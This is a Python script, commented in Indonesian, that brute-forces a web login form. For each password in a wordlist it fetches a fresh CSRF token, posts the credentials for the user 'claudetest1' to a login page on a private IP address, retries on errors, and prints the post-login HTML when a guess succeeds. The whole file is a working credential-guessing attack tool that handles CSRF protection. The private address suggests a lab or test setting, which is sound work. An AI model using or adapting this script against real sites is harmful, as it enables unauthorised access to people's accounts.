import requests
from bs4 import BeautifulSoup
import time

# Konfigurasi
url_login = 'http://192.168.70.202:3333/login2.php'  # Ganti dengan URL login sebenarnya
username = 'claudetest1'
wordlist_file = 'password-wordlists.txt'

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}

session = requests.Session()

def get_csrf_token():
    try:
        response = session.get(url_login, headers=headers)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'csrf_token'}).get('value')
        return token
    except Exception as e:
        print(f'[!] Gagal mengambil CSRF token: {e}')
        return None

def try_login(password):
    csrf_token = get_csrf_token()
    if not csrf_token:
        return False, 'csrf_error', None

    data = {
        'csrf_token': csrf_token,
        'username': username,
        'password': password
    }

    try:
        response = session.post(url_login, headers=headers, data=data)

        # Cek jika login berhasil berdasarkan respons HTML
        if 'dashboard' in response.url or 'logout' in response.text.lower():
            return True, 'success', response.text
        elif 'password salah' in response.text.lower():
            return False, 'wrong_password', None
        elif 'csrf' in response.text.lower():
            return False, 'csrf_invalid', None
        else:
            return False, 'unknown', None
    except requests.RequestException:
        return False, 'request_error', None

# Load wordlist
with open(wordlist_file, 'r', encoding='utf-8') as f:
    passwords = [line.strip() for line in f if line.strip()]

for password in passwords:
    while True:
        success, status, html_content = try_login(password)

        if status == 'csrf_invalid':
            print(f'[-] CSRF invalid, ulangi password: {password}')
            continue
        elif status == 'request_error':
            print(f'[!] Request error, retry dalam 5 detik...')
            time.sleep(5)
            continue
        elif status == 'wrong_password':
            print(f'[-] Gagal login: {password}')
            break
        elif status == 'success':
            print(f'[+] BERHASIL login dengan password: {password}\n')
            print('==== Cuplikan HTML setelah login ====')
            soup = BeautifulSoup(html_content, 'html.parser')
            print(soup.prettify()[:1500])  # Menampilkan 1500 karakter pertama
            exit()
        else:
            print(f'[?] Status tidak diketahui ({status}) untuk: {password}')
            break

print('[X] Tidak ada password yang berhasil.')
